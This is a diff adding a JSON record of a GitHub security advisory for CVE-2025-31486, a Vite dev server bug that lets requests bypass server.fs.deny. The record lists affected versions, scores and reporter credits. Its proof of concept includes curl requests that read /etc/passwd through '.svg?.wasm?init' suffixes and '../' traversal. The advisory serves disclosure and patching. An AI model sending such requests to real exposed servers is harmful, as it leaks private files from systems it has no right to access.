@@ -1,0 +1,255 @@
+{
+  "ghsa_id": "GHSA-xcj6-pq6g-qj4x",
+  "cve_id": "CVE-2025-31486",
+  "url": "https://api.github.com/advisories/GHSA-xcj6-pq6g-qj4x",
+  "html_url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x",
+  "summary": "Vite allows server.fs.deny to be bypassed with .svg or relative paths",
+  "description": "### Summary\n\nThe contents of arbitrary files can be returned to the browser.\n\n### Impact\n\nOnly apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Details\n\n#### `.svg`\n\nRequests ending with `.svg` are loaded at this line.\nhttps://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\nBy adding `?.svg` with `?.wasm?init` or with `sec-fetch-dest: script` header, the restriction was able to bypass.\n\nThis bypass is only possible if the file is smaller than [`build.assetsInlineLimit`](https://vite.dev/config/build-options.html#build-assetsinlinelimit) (default: 4kB) and when using Vite 6.0+.\n\n#### relative paths\n\nThe check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. `../../`).\n\n### PoC\n\n```bash\nnpm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n```\n\nsend request to read `etc/passwd`\n\n```bash\ncurl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'\n```\n\n```bash\ncurl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&?raw'\n```",
+  "type": "reviewed",
+  "severity": "medium",
+  "repository_advisory_url": "https://api.github.com/repos/vitejs/vite/security-advisories/GHSA-xcj6-pq6g-qj4x",
+  "source_code_location": "https://github.com/vitejs/vite",
+  "identifiers": [
+    {
+      "value": "GHSA-xcj6-pq6g-qj4x",
+      "type": "GHSA"
+    },
+    {
+      "value": "CVE-2025-31486",
+      "type": "CVE"
+    }
+  ],
+  "references": [
+    "https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x",
+    "https://nvd.nist.gov/vuln/detail/CVE-2025-31486",
+    "https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647",
+    "https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290",
+    "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"
+  ],
+  "published_at": "2025-04-04T14:20:05Z",
+  "updated_at": "2025-04-30T17:26:54Z",
+  "github_reviewed_at": "2025-04-04T14:20:05Z",
+  "nvd_published_at": "2025-04-03T19:15:39Z",
+  "withdrawn_at": null,
+  "vulnerabilities": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "vite"
+      },
+      "vulnerable_version_range": ">= 6.2.0, < 6.2.5",
+      "first_patched_version": "6.2.5",
+      "vulnerable_functions": []
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "vite"
+      },
+      "vulnerable_version_range": ">= 6.1.0, < 6.1.4",
+      "first_patched_version": "6.1.4",
+      "vulnerable_functions": []
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "vite"
+      },
+      "vulnerable_version_range": ">= 6.0.0, < 6.0.14",
+      "first_patched_version": "6.0.14",
+      "vulnerable_functions": []
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "vite"
+      },
+      "vulnerable_version_range": ">= 5.0.0, < 5.4.17",
+      "first_patched_version": "5.4.17",
+      "vulnerable_functions": []
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "vite"
+      },
+      "vulnerable_version_range": "< 4.5.12",
+      "first_patched_version": "4.5.12",
+      "vulnerable_functions": []
+    }
+  ],
+  "cvss_severities": {
+    "cvss_v3": {
+      "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+      "score": 5.3
+    },
+    "cvss_v4": {
+      "vector_string": null,
+      "score": 0
+    }
+  },
+  "cwes": [
+    {
+      "cwe_id": "CWE-200",
+      "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+    },
+    {
+      "cwe_id": "CWE-284",
+      "name": "Improper Access Control"
+    }
+  ],
+  "credits": [
+    {
+      "user": {
+        "login": "HSwift",
+        "id": 18740745,
+        "node_id": "MDQ6VXNlcjE4NzQwNzQ1",
+        "avatar_url": "https://avatars.githubusercontent.com/u/18740745?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/HSwift",
+        "html_url": "https://github.com/HSwift",
+        "followers_url": "https://api.github.com/users/HSwift/followers",
+        "following_url": "https://api.github.com/users/HSwift/following{/other_user}",
+        "gists_url": "https://api.github.com/users/HSwift/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/HSwift/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/HSwift/subscriptions",
+        "organizations_url": "https://api.github.com/users/HSwift/orgs",
+        "repos_url": "https://api.github.com/users/HSwift/repos",
+        "events_url": "https://api.github.com/users/HSwift/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/HSwift/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "type": "reporter"
+    },
+    {
+      "user": {
+        "login": "Iuhsssss",
+        "id": 63626865,
+        "node_id": "MDQ6VXNlcjYzNjI2ODY1",
+        "avatar_url": "https://avatars.githubusercontent.com/u/63626865?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/Iuhsssss",
+        "html_url": "https://github.com/Iuhsssss",
+        "followers_url": "https://api.github.com/users/Iuhsssss/followers",
+        "following_url": "https://api.github.com/users/Iuhsssss/following{/other_user}",
+        "gists_url": "https://api.github.com/users/Iuhsssss/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/Iuhsssss/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/Iuhsssss/subscriptions",
+        "organizations_url": "https://api.github.com/users/Iuhsssss/orgs",
+        "repos_url": "https://api.github.com/users/Iuhsssss/repos",
+        "events_url": "https://api.github.com/users/Iuhsssss/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/Iuhsssss/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "type": "reporter"
+    },
+    {
+      "user": {
+        "login": "kikayli",
+        "id": 205863854,
+        "node_id": "U_kgDODEU7rg",
+        "avatar_url": "https://avatars.githubusercontent.com/u/205863854?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/kikayli",
+        "html_url": "https://github.com/kikayli",
+        "followers_url": "https://api.github.com/users/kikayli/followers",
+        "following_url": "https://api.github.com/users/kikayli/following{/other_user}",
+        "gists_url": "https://api.github.com/users/kikayli/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/kikayli/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/kikayli/subscriptions",
+        "organizations_url": "https://api.github.com/users/kikayli/orgs",
+        "repos_url": "https://api.github.com/users/kikayli/repos",
+        "events_url": "https://api.github.com/users/kikayli/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/kikayli/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "type": "reporter"
+    },
+    {
+      "user": {
+        "login": "sw0rd1ight",
+        "id": 44807635,
+        "node_id": "MDQ6VXNlcjQ0ODA3NjM1",
+        "avatar_url": "https://avatars.githubusercontent.com/u/44807635?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/sw0rd1ight",
+        "html_url": "https://github.com/sw0rd1ight",
+        "followers_url": "https://api.github.com/users/sw0rd1ight/followers",
+        "following_url": "https://api.github.com/users/sw0rd1ight/following{/other_user}",
+        "gists_url": "https://api.github.com/users/sw0rd1ight/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/sw0rd1ight/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/sw0rd1ight/subscriptions",
+        "organizations_url": "https://api.github.com/users/sw0rd1ight/orgs",
+        "repos_url": "https://api.github.com/users/sw0rd1ight/repos",
+        "events_url": "https://api.github.com/users/sw0rd1ight/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/sw0rd1ight/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "type": "reporter"
+    },
+    {
+      "user": {
+        "login": "do9gy-msec",
+        "id": 105092437,
+        "node_id": "U_kgDOBkOVVQ",
+        "avatar_url": "https://avatars.githubusercontent.com/u/105092437?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/do9gy-msec",
+        "html_url": "https://github.com/do9gy-msec",
+        "followers_url": "https://api.github.com/users/do9gy-msec/followers",
+        "following_url": "https://api.github.com/users/do9gy-msec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/do9gy-msec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/do9gy-msec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/do9gy-msec/subscriptions",
+        "organizations_url": "https://api.github.com/users/do9gy-msec/orgs",
+        "repos_url": "https://api.github.com/users/do9gy-msec/repos",
+        "events_url": "https://api.github.com/users/do9gy-msec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/do9gy-msec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "type": "reporter"
+    },
+    {
+      "user": {
+        "login": "Onetpaer",
+        "id": 90026447,
+        "node_id": "MDQ6VXNlcjkwMDI2NDQ3",
+        "avatar_url": "https://avatars.githubusercontent.com/u/90026447?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/Onetpaer",
+        "html_url": "https://github.com/Onetpaer",
+        "followers_url": "https://api.github.com/users/Onetpaer/followers",
+        "following_url": "https://api.github.com/users/Onetpaer/following{/other_user}",
+        "gists_url": "https://api.github.com/users/Onetpaer/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/Onetpaer/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/Onetpaer/subscriptions",
+        "organizations_url": "https://api.github.com/users/Onetpaer/orgs",
+        "repos_url": "https://api.github.com/users/Onetpaer/repos",
+        "events_url": "https://api.github.com/users/Onetpaer/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/Onetpaer/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "type": "reporter"
+    }
+  ],
+  "cvss": {
+    "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+    "score": 5.3
+  },
+  "epss": {
+    "percentage": 0.40461,
+    "percentile": 0.9856
+  }
+}
